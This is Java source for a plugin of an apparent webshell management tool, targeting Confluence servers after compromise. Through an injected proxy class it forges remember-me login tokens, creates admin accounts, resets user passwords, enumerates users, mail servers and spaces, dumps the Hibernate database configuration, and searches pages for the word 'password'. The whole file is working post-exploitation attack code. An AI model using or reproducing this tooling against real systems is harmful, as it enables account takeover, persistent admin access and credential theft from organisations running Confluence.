package shells.plugins.postconfluence;

import com.formdev.flatlaf.util.StringUtils;
import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import org.fife.ui.rtextarea.RTextScrollPane;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.util.Objects;

@PluginAnnotation(payloadName = "JavaDynamicPayload",Name = "PostConfluence",DisplayName = "PostConfluence")
public class PostConfluencePlugin implements Plugin {

    private JButton makeTokenButton;
    private JButton addAdminUserButton;
    private JButton updatePasswordButton;
    private JButton enumAllUserButton;
    private JButton enumMailServersButton;
    private JButton enumAllSpaceButton;
    private JButton enumHibernateConfigButton;
    private JButton searchPageButton;
    private RTextArea resultTextArea;
    private RTextScrollPane resultTextScrollPane;

    private ShellEntity shellEntity;
    private Payload payload;
    private boolean loaded = false;
    private static final String CLASS_NAME = "PostConfluenceProxy";
    private Encoding encoding;
    private JPanel corePanel;

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        this.encoding = shellEntity.getEncodingModule();
        automaticBindClick.bindJButtonClick(this,this);
    }

    private boolean load(){
        if (!loaded){
            loaded = payload.include(CLASS_NAME, functions.readInputStreamAutoClose(Objects.requireNonNull(PostConfluencePlugin.class.getResourceAsStream("PostConfluenceProxy.classs"))));
        }
        return loaded;
    }
    private void makeTokenButtonClick(ActionEvent actionEvent) {
        if (load()){
            String userName = GOptionPane.showInputDialog("target UserName","admin");
            if (!StringUtils.isEmpty(userName)){
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("username",encoding.Encoding(userName));
                resultTextArea.setText(encoding.Decoding(payload.evalFunc(CLASS_NAME,"addRememberMeToken",reqParameter)));
            }
        }else {
            resultTextArea.setText("plugin not loaded");
        }
    }
    private void addAdminUserButtonClick(ActionEvent actionEvent) {
        if (load()){

            JLabel userNameLabel = new JLabel("username:");
            JLabel passwordLabel = new JLabel("password:");
            JLabel emailLabel = new JLabel("email:");

            JTextField usernameTextField= new JTextField("john");
            JTextField passwordTextField = new JTextField("Password123!");
            JTextField emailTextField = new JTextField("john@example.com");

            JPanel propertyPanel = new JPanel();
            propertyPanel.setLayout(new GridLayout(3,2,5,5));
            propertyPanel.add(userNameLabel);
            propertyPanel.add(usernameTextField);
            propertyPanel.add(passwordLabel);
            propertyPanel.add(passwordTextField);
            propertyPanel.add(emailLabel);
            propertyPanel.add(emailTextField);

            int option = GOptionPane.showConfirmDialog( UiFunction.getParentWindow(corePanel),propertyPanel, "Input Property", GOptionPane.OK_CANCEL_OPTION);

            if (option == GOptionPane.CANCEL_OPTION){
                GOptionPane.showMessageDialog(UiFunction.getParentWindow(corePanel),"取消操作");
                return;
            }

            String userName = usernameTextField.getText();
            String password = passwordTextField.getText();
            String email = emailTextField.getText();

            if (!StringUtils.isEmpty(userName) && !StringUtils.isEmpty(password) && !StringUtils.isEmpty(email)){
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("username",encoding.Encoding(userName));
                reqParameter.add("password",encoding.Encoding(password));
                reqParameter.add("email",encoding.Encoding(email));
                resultTextArea.setText(encoding.Decoding(payload.evalFunc(CLASS_NAME,"addAdminUser",reqParameter)));
            }
        }else {
            resultTextArea.setText("plugin not loaded");
        }
    }
    private void updatePasswordButtonClick(ActionEvent actionEvent) {
        if (load()){

            JLabel userNameLabel = new JLabel("username:");
            JLabel passwordLabel = new JLabel("password:");

            JTextField usernameTextField= new JTextField("john");
            JTextField passwordTextField = new JTextField("Password123!");

            JPanel propertyPanel = new JPanel();
            propertyPanel.setLayout(new GridLayout(2,2,5,5));
            propertyPanel.add(userNameLabel);
            propertyPanel.add(usernameTextField);
            propertyPanel.add(passwordLabel);
            propertyPanel.add(passwordTextField);

            int option = GOptionPane.showConfirmDialog( UiFunction.getParentWindow(corePanel),propertyPanel, "Input Property", GOptionPane.OK_CANCEL_OPTION);

            if (option == GOptionPane.CANCEL_OPTION){
                GOptionPane.showMessageDialog(UiFunction.getParentWindow(corePanel),"取消操作");
                return;
            }

            String userName = usernameTextField.getText();
            String password = passwordTextField.getText();

            if (!StringUtils.isEmpty(userName) && !StringUtils.isEmpty(password)){
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("username",encoding.Encoding(userName));
                reqParameter.add("password",encoding.Encoding(password));
                resultTextArea.setText(encoding.Decoding(payload.evalFunc(CLASS_NAME,"updateUserPassword",reqParameter)));
            }
        }else {
            resultTextArea.setText("plugin not loaded");
        }
    }
    private void enumAllUserButtonClick(ActionEvent actionEvent) {
        if (load()){
            ReqParameter reqParameter = new ReqParameter();
            resultTextArea.setText(encoding.Decoding(payload.evalFunc(CLASS_NAME,"getUserInfos",reqParameter)));
        }else {
            resultTextArea.setText("plugin not loaded");
        }
    }
    private void enumMailServersButtonClick(ActionEvent actionEvent) {
        if (load()){
            ReqParameter reqParameter = new ReqParameter();
            resultTextArea.setText(encoding.Decoding(payload.evalFunc(CLASS_NAME,"getMailServers",reqParameter)));
        }else {
            resultTextArea.setText("plugin not loaded");
        }
    }
    private void enumAllSpaceButtonClick(ActionEvent actionEvent) {
        if (load()){
            ReqParameter reqParameter = new ReqParameter();
            resultTextArea.setText(encoding.Decoding(payload.evalFunc(CLASS_NAME,"getAllSpace",reqParameter)));
        }else {
            resultTextArea.setText("plugin not loaded");
        }
    }
    private void enumHibernateConfigButtonClick(ActionEvent actionEvent) {
        if (load()){
            ReqParameter reqParameter = new ReqParameter();
            resultTextArea.setText(encoding.Decoding(payload.evalFunc(CLASS_NAME,"getHibernateConfig",reqParameter)));
        }else {
            resultTextArea.setText("plugin not loaded");
        }
    }
    private void searchPageButtonClick(ActionEvent actionEvent) {
        if (load()){
            String condition = GOptionPane.showInputDialog("condition","password");
            if (!StringUtils.isEmpty(condition)){
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("condition",encoding.Encoding(condition));
                resultTextArea.setText(encoding.Decoding(payload.evalFunc(CLASS_NAME,"searchPage",reqParameter)));
            }
        }else {
            resultTextArea.setText("plugin not loaded");
        }
    }

    @Override
    public JPanel getView() {
        return corePanel;
    }
}
